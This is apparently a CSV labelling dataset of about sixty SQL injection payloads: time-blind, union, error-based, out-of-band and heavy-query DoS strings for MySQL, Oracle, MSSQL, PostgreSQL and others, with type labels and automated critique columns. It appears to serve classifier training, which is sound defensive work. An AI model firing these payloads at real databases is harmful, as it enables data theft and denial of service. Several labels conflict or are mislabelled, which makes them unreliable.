payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"1 ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 6829 = 6829",time_blind,sqlite,0.7,like_randomblob,RELABEL,reasoning too short (15 chars),time_blind,sqlite,25502,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1 ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 6829 = 6829"
"-5231%"" or 4945 = 8402#",boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,25503,boolean_blind,generic,Pattern match: 'or 4945 = 8402' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-5231%"" or 4945 = 8402#"
1' ) as yqld where 2489 = 2489,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,25504,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) as yqld where 2489 = 2489
1' and sleep ( 5 ) and 'pfgy' = 'pfgy,time_blind,mysql,0.9,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,25505,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1' and sleep ( 5 ) and 'pfgy' = 'pfgy
"-5160' ) union all select 8067,8067,8067,8067,8067,8067,8067--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,25506,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5160' ) union all select 8067,8067,8067,8067,8067,8067,8067--"
"1' ) ) as eleh where 1347 = 1347 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",time_blind,postgresql,0.7,generate_series,RELABEL,reasoning too short (15 chars); rule-check disagrees: rule says 'heavy_query' (P4) but labeled 'time_blind' (P5),heavy_query,postgresql,25507,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1' ) ) as eleh where 1347 = 1347 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
"-8205' or elt ( 6581 = 3480,3480 ) and 'sosv' = 'sosv",boolean_blind,mysql,0.7,elt_boolean,RELABEL,reasoning too short (11 chars),boolean_blind,mysql,25508,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"-8205' or elt ( 6581 = 3480,3480 ) and 'sosv' = 'sosv"
"1"" ) ) as dooq where 7911 = 7911",boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,25509,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) ) as dooq where 7911 = 7911"
"-6965' ) union all select 2857,2857,2857,2857,2857,2857,2857,2857,2857,2857--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,25510,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6965' ) union all select 2857,2857,2857,2857,2857,2857,2857,2857,2857,2857--"
1' ) ) as yefv where 4263 = 4263,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,25511,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) as yefv where 4263 = 4263
"1%"" ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ""%"" = """,time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,25512,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1%"" ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ""%"" = """
1'+ ( select bfeq where 3445 = 3445 and 9198 = 9198--,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,25513,boolean_blind,generic,Pattern match: 'and 9198 = 9198' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1'+ ( select bfeq where 3445 = 3445 and 9198 = 9198--
"-6870"" ) as deox where 8198 = 8198 union all select 8198#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,25514,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6870"" ) as deox where 8198 = 8198 union all select 8198#"
"1 where 2031 = 2031 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.7,mssql_sysjoin,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,25515,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1 where 2031 = 2031 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --"
"-6020'+ ( select isrz where 2489 = 2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,25516,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6020'+ ( select isrz where 2489 = 2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--"
"1%' ) ) union all select null,null--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,25517,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%' ) ) union all select null,null--"
( select ( case when ( 1421 = 1421 ) then 1 else 1421* ( select 1421 from master..sysdatabases ) end ) ),error_based,mssql,0.9,mssql_cast,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mssql,25518,boolean_blind,mssql,generic SQL keywords without specific signal,boolean_blind,mssql,generic SQL structure without strong signal,( select ( case when ( 1421 = 1421 ) then 1 else 1421* ( select 1421 from master..sysdatabases ) end ) )
1' where 9206 = 9206,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,25519,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' where 9206 = 9206
1'+ ( select tafk where 9652 = 9652,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,25520,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'+ ( select tafk where 9652 = 9652
"1',iif ( 4861 = 6268,1,1/0 )",boolean_blind,mssql,0.7,iif_boolean,RELABEL,reasoning too short (11 chars),boolean_blind,mssql,25521,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"1',iif ( 4861 = 6268,1,1/0 )"
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( 'pshn' like 'pshn",heavy_query,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,25522,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( 'pshn' like 'pshn"
"1'+ ( select 'zkum' where 5161 = 5161 union all select null,null,null,null#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,25523,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1'+ ( select 'zkum' where 5161 = 5161 union all select null,null,null,null#"
"1'|| ( select 'dpce' from dual where 5261 = 5261 union all select null,null,null,null,null,null--",union_based,oracle,0.7,oracle_union,RELABEL,reasoning too short (12 chars),union_based,oracle,25524,union_based,oracle,Pattern match: 'union all select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure,"1'|| ( select 'dpce' from dual where 5261 = 5261 union all select null,null,null,null,null,null--"
"-9445 ) as dmur where 4371 = 4371 union all select 4371,4371,4371,4371,4371,4371,4371,4371,4371,4371#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,25525,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9445 ) as dmur where 4371 = 4371 union all select 4371,4371,4371,4371,4371,4371,4371,4371,4371,4371#"
-9660 ) ) or 9762 = 9698,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,25526,boolean_blind,generic,Pattern match: 'or 9762 = 9698' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-9660 ) ) or 9762 = 9698
"1 where 9083 = 9083 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.9,extractvalue,RELABEL,reasoning too short (12 chars),error_based,mysql,25527,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 where 9083 = 9083 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #"
"1"" ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ""bfko"" = ""bfko",out_of_band,oracle,0.9,utl_inaddr,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,25528,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"1"" ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ""bfko"" = ""bfko"
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ""%"" = """,heavy_query,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,25529,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ""%"" = """
"1 ) ) as midl where 9046 = 9046 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe,RELABEL,reasoning too short (9 chars),time_blind,oracle,25530,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1 ) ) as midl where 9046 = 9046 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --"
1' ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( 'qiau' = 'qiau,time_blind,postgresql,0.9,pg_sleep,RELABEL,reasoning too short (8 chars),time_blind,postgresql,25531,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1' ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( 'qiau' = 'qiau
1 where 9393 = 9393 waitfor delay '0:0:5'--,time_blind,mssql,0.9,waitfor,RELABEL,reasoning too short (7 chars),time_blind,mssql,25532,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,1 where 9393 = 9393 waitfor delay '0:0:5'--
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5# pdyo",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,25533,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5# pdyo"
"1%' union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,25534,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%' union all select null,null,null,null,null,null,null,null#"
"1%"" and sleep ( 5 ) #",time_blind,mysql,0.9,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,25535,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1%"" and sleep ( 5 ) #"
"1%' ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,25536,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1%' ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --"
"1%' procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and '%' = '",error_based,mysql,0.9,extractvalue,RELABEL,reasoning too short (12 chars),error_based,mysql,25537,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1%' procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and '%' = '"
"-4869%' union all select 5729,5729,5729--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,25538,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4869%' union all select 5729,5729,5729--"
"1' ) and make_set ( 8403 = 8403,8899 )",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,25539,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1' ) and make_set ( 8403 = 8403,8899 )"
-8463 ) ) ) or 4861 = 9834#,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,25540,boolean_blind,generic,Pattern match: 'or 4861 = 9834' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-8463 ) ) ) or 4861 = 9834#
"1%' ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( '%' = '",error_based,mysql,0.9,updatexml,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,25541,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1%' ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( '%' = '"
"1' ) where 8252 = 8252 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,25542,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) where 8252 = 8252 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #"
"1 ) ) union all select null,null,null,null,null#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,25543,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) ) union all select null,null,null,null,null#"
-3867%' ) or 3084 = 5633 and ( '%' = ',boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,25544,boolean_blind,generic,Pattern match: 'or 3084 = 5633' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-3867%' ) or 3084 = 5633 and ( '%' = '
"create or replace function sleep ( int ) returns int as '/lib/libc.so.6','sleep' language 'c' strict",time_blind,mssql,0.9,waitfor,RELABEL,reasoning too short (7 chars),time_blind,mssql,25545,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"create or replace function sleep ( int ) returns int as '/lib/libc.so.6','sleep' language 'c' strict"
-7565%' ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( '%' = ',error_based,mssql,0.9,convert_char,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,25546,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,-7565%' ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( '%' = '
select ( case when ( 6287 = 8341 ) then 6287 else 1/ ( select 0 ) end ) --,error_based,mysql,0.9,exp_extract,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,25547,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 6287 = 8341 ) then 6287 else 1/ ( select 0 ) end ) --
-2456' ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( 'bbkp' = 'bbkp,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,25548,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,-2456' ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( 'bbkp' = 'bbkp
"1%"" ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,25549,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1%"" ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --"
"1"" ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( ""text"" like ""text",boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,25550,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)","1"" ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( ""text"" like ""text"
"-2364'+ ( select 'qdut' where 7560 = 7560 union all select 7560,7560,7560,7560,7560--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,25551,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2364'+ ( select 'qdut' where 7560 = 7560 union all select 7560,7560,7560,7560,7560--"
"1' ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 'uadr' like 'uadr",heavy_query,mssql,0.7,mssql_sysjoin,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,25552,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1' ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 'uadr' like 'uadr"
"1%' ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( '%' = '",heavy_query,db2,0.7,db2_sysjoin,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,25553,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"1%' ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( '%' = '"
-1354 ) ) or 8571 = 8571--,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,25554,boolean_blind,generic,Pattern match: 'or 8571 = 8571' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-1354 ) ) or 8571 = 8571--
"1' ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,0.7,elt_sleep,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,25555,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1' ) and elt ( 3114 = 3114,sleep ( 5 ) ) #"
"-7743"" or 9323 = 9323#",boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,25556,boolean_blind,generic,Pattern match: 'or 9323 = 9323' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-7743"" or 9323 = 9323#"
"-9928"" ) ) union all select 7511,7511,7511,7511,7511,7511,7511,7511#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,25557,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9928"" ) ) union all select 7511,7511,7511,7511,7511,7511,7511,7511#"
"1 ) where 9213 = 9213 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.7,db2_sysjoin,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,25558,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"1 ) where 9213 = 9213 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --"
1'|| ( select 'ghby' from dual where 4854 = 4854,union_based,oracle,0.7,oracle_union,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,oracle,25559,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,1'|| ( select 'ghby' from dual where 4854 = 4854
-4032' ) where 5157 = 5157 or 1809 = 2810#,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,25560,boolean_blind,generic,Pattern match: 'or 1809 = 2810' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-4032' ) where 5157 = 5157 or 1809 = 2810#
"1"" ) ) and elt ( 4249 = 4249,7259 ) and ( ( ""abcm"" like ""abcm",boolean_blind,mysql,0.7,elt_boolean,RELABEL,reasoning too short (11 chars),boolean_blind,mysql,25561,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1"" ) ) and elt ( 4249 = 4249,7259 ) and ( ( ""abcm"" like ""abcm"
1' ) or sleep ( 5 ) and ( 'kgbm' = 'kgbm,time_blind,mysql,0.9,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,25562,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1' ) or sleep ( 5 ) and ( 'kgbm' = 'kgbm
"1'|| ( select 'eils' where 8308 = 8308 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,25563,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1'|| ( select 'eils' where 8308 = 8308 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #"
"1 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) -- xsob",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,25564,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) -- xsob"
1 ) where 2307 = 2307,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,25565,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) where 2307 = 2307
